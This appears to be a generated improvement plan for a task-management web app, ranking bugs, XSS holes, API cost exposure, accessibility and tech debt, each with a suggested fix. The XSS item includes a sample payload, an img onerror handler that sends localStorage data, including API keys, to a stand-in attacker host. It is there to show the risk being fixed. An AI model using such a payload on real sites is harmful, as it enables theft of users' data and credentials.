# Arete — Improvement Plan
_Generated: 2026-08-11_

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

### 1. Push notification icon path is broken
**What:** Service worker and inline `Notification()` calls reference `./icons/icon-192.png`, but the file lives at `./icon-192.png` (no `icons/` subdirectory). Every push notification silently shows no icon — or silently fails on strict platforms.
**Where:** `sw.js:46–47`, `index.html:11289`
**Why it matters:** Any user who clicks a reminder link gets either a broken notification or none at all, directly undermining the "habit / reminder" retention loop.
**Effort:** S
**Suggested fix:**
- Change `./icons/icon-192.png` → `./icon-192.png` in both `sw.js` and `index.html:11289`.
- Bump the service-worker cache name (`CACHE = 'arete-20260723'` → `'arete-20260812'`) so the patched SW is installed immediately.

---

### 2. XSS: task/goal titles injected raw into `innerHTML`
**What:** Task and goal titles are user-controlled strings that are inserted into the DOM without escaping in at least four spots, making stored-XSS trivial.
**Where:**
- `index.html:3223` — `inboxHTML()`: `` `${t.title}` `` in innerHTML
- `index.html:3594` — `renderWizPanel()` step 1: `` `${t.title}` `` in innerHTML
- `index.html:3601` — `renderWizPanel()` step 2: `` `${t.title}` `` in innerHTML
- `index.html:3844` — `delTask()` toast: `` `<strong>${t.title.slice(0,30)}</strong>` `` via `toast()` which itself uses `innerHTML` (line 2789)
**Why it matters:** A task title like `<img src=x onerror="fetch('https://evil.example/steal?d='+btoa(localStorage.getItem('taskos')))">` silently exfiltrates the entire app state including API keys. Particularly dangerous because the `toast()` function always renders HTML (line 2789: `el.innerHTML=msg`).
**Effort:** S
**Suggested fix:**
- Wrap bare title/goal references with the existing `esc()` function: `${esc(t.title)}`.
- Audit every template literal that sets `innerHTML` with user data; the `esc()` function already exists at line 11776.
- Consider making `toast()` accept a `{html: true}` flag and default to `el.textContent` for plain messages.

---

### 3. AI proxy not wired up — AI features dead for all users
**What:** `APP_CONFIG.aiProxy` is an empty string (`index.html:9959`), so the "AI Triage", "Plan My Day", "AI Coach", and all AI workflow features silently fail with "Add your Claude API key in Settings" — which most users won't have. The `/api/claude.js` Vercel function is deployed but never called.
**Where:** `index.html:9959`, `api/claude.js`
**Why it matters:** AI is the main differentiated feature. Every new user who hits the AI buttons immediately hits a dead end, and the app's unique value is invisible.
**Effort:** S
**Suggested fix:**
- Set `aiProxy: '/api/claude'` (relative URL works on Vercel and avoids hardcoding the hostname).
- Verify `ANTHROPIC_API_KEY` is set in Vercel environment variables.
- Add a basic user-count rate-limit header (e.g., Upstash or Vercel KV) to the proxy — the note at `api/claude.js:12` flags this as missing but unaddressed.

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

### 4. 20+ AI prompts are hardcoded for "Panos / Givelink / SF move"
**What:** Prompts for relationship nudges, discomfort coaching, brand audit, decision suggestions, morning briefing, book synthesis, and weekly review all contain the literal strings "Panos", "Givelink", "Greek founder", "SF move". Other users get AI advice written for a specific individual.
**Where:** `index.html:5647, 5920, 7319, 7477, 7849, 7850, 8604, 9806, 9807, 11254, 11415, 11516, 11524, 11672, 11734, 11810` (plus ~4 others)
**Why it matters:** Any user who shares the app or this becomes a public product gets comically irrelevant AI responses. The `profileName` variable and `getAboutMe()` function already exist for this purpose and are used in about half the prompts correctly.
**Effort:** M
**Suggested fix:**
- Replace all hardcoded `"Panos"` / `"Givelink"` occurrences in prompt strings with `profileName` and `getAboutMe()`.
- Change the default reminder message at line 11254 from `'Good morning Panos!'` to `` `Good morning ${profileName}!` ``.
- Change the default `profileName` fallback at line 2519 from `'Panos'` to `'there'` (so greeting reads "Good morning, there 👋" until the user sets their name).

---

### 5. Navigation items are `<div>` elements — keyboard users can't navigate
**What:** All sidebar navigation items (`index.html:999–1003`) are `<div>` tags with `onclick` handlers instead of `<button>` or `<a>`. They have no `tabindex`, no `role="button"`, no `aria-current`, and no keyboard event handler (`Enter`/`Space`).
**Where:** `index.html:999–1004` (and throughout the mobile `<div class="bni">` bottom nav)
**Why it matters:** The app is entirely inaccessible via keyboard navigation. Screen readers can't discover the menu. This also blocks power users who prefer keyboard-only workflows — the exact audience the "Superhuman-speed" positioning targets.
**Effort:** M
**Suggested fix:**
- Change `.ni` items to `<button>` or add `role="button" tabindex="0"` and a `onkeydown` handler that fires `onclick` on Enter/Space.
- Add `aria-current="page"` to the active nav item.
- Apply the same fix to `.bni` mobile bottom nav items.

---

### 6. No rate limiting on Claude API proxy — cost exposure
**What:** `api/claude.js` performs no per-user or per-IP rate limiting. Any person with the URL can make unlimited Anthropic API calls at the app owner's expense. The comment at line 12 explicitly acknowledges this gap.
**Where:** `api/claude.js:12–48`
**Why it matters:** A single malicious user or script can exhaust the entire Anthropic quota within minutes. At `claude-haiku-4-5` pricing this could mean hundreds of dollars per day.
**Effort:** M
**Suggested fix:**
- Add Upstash Redis rate-limiting (free tier covers ~10k requests/day): check `Authorization` header for the Supabase user ID and limit to ~20 AI requests per user per hour.
- As a quick-win before that: validate that `SUPABASE_URL` is always set (currently optional) so unauthenticated requests are always rejected in production.

---

### 7. Hardcoded Vercel subdomain in OG tags and share canvas
**What:** Open Graph meta tags, canonical URL, and the share-card canvas watermark all hardcode `https://task-management-beige-eight.vercel.app/`, the auto-generated Vercel subdomain.
**Where:** `index.html:24–32`, `index.html:10180`, `index.html:10232`, `landing.html:11–25`
**Why it matters:** Social previews, search engine indexing, and shared progress cards all point to the wrong domain if the app moves to a custom domain. Share cards watermark reads `task-management-beige-eight.vercel.app` — not exactly polished for users.
**Effort:** S
**Suggested fix:**
- Add `appUrl` to `APP_CONFIG` (default: `window.location.origin`) and reference it in OG tags via a `<script>` that patches the meta tags at load time, or set correct values at build time.
- Change the canvas watermark (line 10232) to use `window.location.hostname`.

---

### 8. `toast()` renders arbitrary HTML — accidental injection vector
**What:** The `toast()` function (line 2789) always uses `el.innerHTML=msg`. Many callers pass controlled strings (e.g., with undo links), but `delTask()` at line 3844 passes `t.title` directly as an `<strong>` child without escaping.
**Where:** `index.html:2789`, callers at `index.html:3844, 3893, 3896`
**Why it matters:** Closes the XSS surface from P0 item #2, and prevents future regressions from callers inadvertently passing user data.
**Effort:** S
**Suggested fix:**
- Escape `t.title` at line 3844: `esc(t.title.slice(0,30))`.
- Make `toast()` default to `textContent` and add a second param flag `toast(msg, ms, {html:true})` for callers that genuinely need HTML (undo link, XP pop).

---

## 🛠 P2 — Code health (tech debt slowing velocity)

### 9. Single 14,924-line `index.html` monolith
**What:** The entire app — CSS, HTML, 12,000+ lines of JavaScript — lives in one file. There are no modules, no separation of concerns, and no way to run isolated tests.
**Where:** `index.html` (entire file)
**Why it matters:** Any change risks breaking an unrelated feature with no test coverage to catch it. The file takes several seconds to search and is impractical to review as a diff. Adding features now means scrolling through ~15,000 lines to find the right function.
**Effort:** L
**Suggested fix:**
- Extract JavaScript into ES modules (`src/state.js`, `src/render.js`, `src/ai.js`, `src/sync.js`) referenced via `<script type="module">`.
- Extract CSS into a stylesheet; it's ~700 lines of variables and utility classes that would benefit from being in a separate file.
- No need to rewrite — incremental extraction per feature area is sufficient.

---

### 10. Stale rebrand artifacts still present
**What:** `manifest-givelink.json` is still cached by the service worker (`sw.js:4`), `givelink.html` is still listed in the HTML cache list (`sw.js:16`), and the `CATS` dictionary still exposes `givelink` as a first-class task category displayed to users (`index.html:2503`).
**Where:** `sw.js:4, 16`, `index.html:2503, 2984` (`givelink-dash` view), `S` state object (`givelinkMetrics`, `givelinkHistory`)
**Why it matters:** Users see "🟣 Givelink" as a task category, which is meaningless to anyone who isn't the owner. The state object carries `givelinkMetrics` as a top-level field that will be in every user's exported JSON. The SW caches a file (`givelink.html`) that is not core-app infrastructure.
**Effort:** M
**Suggested fix:**
- Remove `manifest-givelink.json` and `givelink.html` from the SW cache lists.
- Rename the `givelink` category to `business` or `startup` with a generic emoji.
- Move `givelinkMetrics` / `givelinkHistory` into a separate owner-only namespace or remove from the default state schema.

---

### 11. Missing error handling on third-party API fetches
**What:** `_rwFetch()` at line 10819 (Readwise) and the Notion fetch at line 10940 propagate errors but callers aren't all wrapped in try/catch. More critically, `_sbAuth()` at line 10012 and `_sbPull()` / `_sbPush()` at lines 10398–10409 are `async` functions called without `await` error handling in some call sites.
**Where:** `index.html:10012, 10398, 10409, 10819`
**Why it matters:** A network timeout or Supabase 5xx response can silently drop a sync operation with no user feedback, causing data divergence between devices.
**Effort:** S
**Suggested fix:**
- Wrap `_sbPull()`/`_sbPush()` call sites in `try/catch` that surface a toast: "Sync failed — retrying".
- Add a retry with exponential backoff (1 retry is enough for transient errors) before surfacing the error.

---

### 12. Default seed data is personal — confusing for new users
**What:** `seed()` at lines 4546–4900+ populates the backlog with ~80 tasks specific to the owner's business (Givelink targets, SF relocation milestones, Greek nonprofit board applications). Every new user who triggers seeding sees these private tasks.
**Where:** `index.html:4546–4900` (approximately)
**Why it matters:** New users sign up and immediately see a backlog full of tasks about "Greek Nonprofits Board" and "Song on Givelink". This breaks first-run trust and makes the app look like it leaked someone else's data.
**Effort:** M
**Suggested fix:**
- Replace the seed data with 5–8 generic getting-started tasks (e.g., "Set your first goal", "Try AI triage", "Add a habit").
- Move the owner-specific tasks to a private template or remove them from the source.

---

## 💡 P3 — Nice to have

### 13. PostHog analytics not connected
**What:** `APP_CONFIG.posthogKey` is an empty string, so `_initPostHog()` exits immediately and `track()` is a no-op everywhere.
**Where:** `index.html:9960, 10388–10394`
**Why it matters:** There is zero visibility into which features users actually use, where they drop off, or whether any growth improvements are working.
**Effort:** S
**Suggested fix:** Paste a PostHog project key into `APP_CONFIG.posthogKey`. The plumbing is already complete.

---

### 14. `manifest-givelink.json` served but likely outdated
**What:** `manifest-givelink.json` exists and is cached, but its content has not been reviewed since the rebrand. It likely still says "Givelink" in its `name` field.
**Where:** `manifest-givelink.json`, `sw.js:4`
**Why it matters:** If any PWA install path references this manifest, installed app icons and names will be wrong.
**Effort:** S
**Suggested fix:** Open `manifest-givelink.json`, check `name`/`short_name`/`description` fields, and either update or delete the file (with a corresponding SW cache removal).

---

### 15. Open Graph image alt text repeats the title verbatim
**What:** `<meta property="og:image:alt">` at line 28 reads "Arete · Command your day. Quiet your mind." — identical to the page title. This is not useful for screen readers that encounter the shared link.
**Where:** `index.html:28`
**Why it matters:** Minor accessibility and SEO issue; a descriptive alt like "Arete app screenshot showing the task dashboard" is more useful.
**Effort:** S
**Suggested fix:** Update `og:image:alt` to describe what the screenshot actually shows.

---

### 16. `supabaseAnon` key in source is fine, but commit history exposes it permanently
**What:** `APP_CONFIG.supabaseAnon` (line 9958) contains the publishable Supabase anon key. It's safe in the browser because RLS enforces auth, but it now lives in git history forever.
**Where:** `index.html:9958`
**Why it matters:** If RLS is ever misconfigured, the key is already public. More importantly, developers who copy this template will start with a real, active Supabase project key exposed in their repo.
**Effort:** S
**Suggested fix:** Replace with a placeholder comment instructing users to fill in their own key; load the actual key from a Vercel environment variable and inject it at build time, or keep it but add a `SUPABASE_ANON_PLACEHOLDER` pattern that CI can scan for.

---

_Total items: 16 (3 P0 · 5 P1 · 4 P2 · 4 P3)_
